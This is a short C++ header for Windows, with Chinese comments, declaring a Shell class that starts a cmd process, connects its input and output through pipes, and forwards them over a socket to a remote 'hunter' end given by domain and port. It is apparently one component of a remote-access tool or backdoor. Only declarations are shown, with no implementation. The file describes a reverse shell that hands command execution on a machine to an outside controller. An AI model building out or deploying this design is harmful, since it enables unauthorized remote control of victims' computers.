// 创建cmd进程 通过管道连接其输入输出
// 并将管道内容转发至socket到hunter端
// 使得hunter端能够与cmd进程交互
// 使用单例模式

#pragma once
#include <strsafe.h>
#include "TcpSocket.h"
#include <string>

class Shell
{
public:
	// 本类入口函数 创建cmd进程并做好管道连接 并开启线程
	static void startShell(std::string domain, int port);
	// 线程函数 负责读socket并转发 负责命令输入
	static DWORD WINAPI threadReadSock(LPVOID args);
	// 线程函数 负责读pipe并转发 负责命令输出
	static DWORD WINAPI threadReadPipe(LPVOID args);
	// 启动cmd子进程并准备好管道
	static bool createCmd();
};

